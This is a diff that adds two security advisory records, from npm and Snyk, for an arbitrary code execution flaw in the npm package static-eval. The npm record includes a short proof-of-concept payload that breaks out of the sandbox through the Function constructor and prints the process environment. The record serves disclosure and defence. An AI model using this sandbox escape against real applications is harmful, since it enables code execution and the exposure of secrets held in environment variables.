@@ -27,6 +27,64 @@
   credit: Matt Austin
   references: https://npmjs.com/advisories/548
   source_url: https://npmjs.com/advisories/548
+- id: npmjs:npm:static-eval:758
+  title: Sandbox Breakout / Arbitrary Code Execution
+  description: |-
+    Versions of `static-eval`prior to 2.0.2 pass untrusted user input directly to the global function constructor, resulting in an arbitrary code execution vulnerability when user input is parsed via the package.
+
+    ## Proof of concept
+    ```
+    var evaluate = require('static-eval');
+    var parse = require('esprima').parse;
+
+    var src = process.argv[2];
+    var payload = '(function({x}){return x.constructor})({x:"".sub})("console.log(process.env)")()'
+    var ast = parse(payload).body[0].expression;
+    console.log(evaluate(ast, {x:1}));
+    ```
+  affected_package: static-eval
+  vulnerable_versions:
+  - "<=2.0.1"
+  severity: medium
+  package_manager: npm
+  cwe: CWE-20
+  disclosed_date: 1970-01-01
+  created_date: 1970-01-01
+  last_modified_date: 1970-01-01
+  credit: Matías Lang
+  references: https://npmjs.com/advisories/758
+  source_url: https://npmjs.com/advisories/758
+- id: snykio:npm:static-eval:173693
+  title: Arbitrary Code Execution
+  description: |
+    [static-eval][1] evaluates statically-analyzable expressions.
+
+    Affected versions of this package are vulnerable to Arbitrary Code
+    Execution. It passes untrusted user input directly to the global
+    function constructor, resulting in an arbitrary code execution
+    vulnerability when user input is parsed via the package.
+
+
+
+    [1]: https://www.npmjs.com/package/static-eval
+  affected_package: static-eval
+  vulnerable_versions:
+  - "<2.0.2"
+  severity: high
+  package_manager: npm
+  cwe:
+  - CWE-94
+  disclosed_date: 2019-01-03
+  created_date: 2019-02-14
+  last_modified_date: 2019-02-14
+  credit:
+  - Matias Lang
+  references:
+  - https://github.com/browserify/static-eval/commit/32f8efd072625e267aa7237d2daff35738c50d2a
+  - https://github.com/substack/static-eval/pull/21
+  - https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/
+  - https://www.npmjs.com/advisories/758
+  source_url: https://snyk.io/vuln/SNYK-JS-STATICEVAL-173693
 - id: snykio:npm:static-eval:20171016
   title: Arbitrary Code Execution
   description: |
